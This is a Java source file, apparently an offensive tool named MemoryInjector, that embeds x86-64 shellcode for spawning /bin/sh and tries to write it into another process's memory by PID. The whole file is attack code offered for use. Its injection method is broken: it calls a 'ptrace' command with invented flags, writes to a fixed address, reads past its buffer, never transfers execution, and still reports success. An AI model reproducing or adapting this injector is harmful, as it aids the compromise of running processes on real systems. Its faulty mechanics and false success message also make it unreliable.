import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class Main {

    // The shellcode that calls /bin/sh
    private static final byte[] shellcode = {
            (byte) 0x31, (byte) 0xc0, (byte) 0x48, (byte) 0xbb, (byte) 0xd1, (byte) 0x9d, (byte) 0x96, (byte) 0x91,
            (byte) 0xd0, (byte) 0x8c, (byte) 0x97, (byte) 0xff, (byte) 0x48, (byte) 0xf7, (byte) 0xdb, (byte) 0x53,
            (byte) 0x54, (byte) 0x5f, (byte) 0x99, (byte) 0x52, (byte) 0x57, (byte) 0x54, (byte) 0x5e, (byte) 0xb0,
            (byte) 0x3b, (byte) 0x0f, (byte) 0x05
    };

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: java MemoryInjector <pid>");
            return;
        }

        int pid = Integer.parseInt(args[0]);
        int size = shellcode.length;

        try {
            // Attach to the process
            Runtime.getRuntime().exec("ptrace -attach " + pid).waitFor();

            // Allocate memory buffer for shellcode
            ByteBuffer buffer = ByteBuffer.allocate(size).order(ByteOrder.LITTLE_ENDIAN);
            buffer.put(shellcode);

            // Write shellcode into process memory
            for (int i = 0; i < size; i += 4) {
                long word = buffer.getInt(i) & 0xFFFFFFFFL; // Ensure unsigned int
                Runtime.getRuntime().exec("ptrace -d -w -p " + pid + " -poke " + (i + 0x400000) + " -data " + word)
                        .waitFor();
            }

            // Detach from the process
            Runtime.getRuntime().exec("ptrace -d -d " + pid).waitFor();

            System.out.println("Shellcode injected successfully into process " + pid);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
